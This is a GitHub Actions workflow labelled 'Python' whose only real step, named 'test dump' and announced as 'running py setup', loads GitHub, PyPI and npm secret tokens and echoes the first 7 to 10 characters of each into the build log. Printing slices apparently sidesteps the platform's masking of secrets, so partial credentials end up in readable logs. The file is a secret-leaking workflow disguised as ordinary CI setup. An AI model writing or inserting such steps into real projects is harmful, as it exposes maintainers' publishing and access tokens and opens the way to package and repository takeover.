name: Python


on:
  push:
    branches: []
  pull_request:
    branches: []

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: test dump
        env:
          TOKEN_1: ${{ secrets.GITHUB_TOKEN }}
          TOKEN_2: ${{ secrets.GH_TOKEN }}
          TOKEN_3: ${{ secrets.PYPI_TOKEN }}
          TOKEN_4: ${{ secrets.NPM_TOKEN }}
        run: |
          dir
          echo "running py setup"
          echo "TOKEN 1 ${TOKEN_1:0:10}"
          echo "TOKEN 2 ${TOKEN_2:0:7}"
          echo "TOKEN 3 ${TOKEN_3:0:7}"
          echo "TOKEN 4 ${TOKEN_4:0:7}"
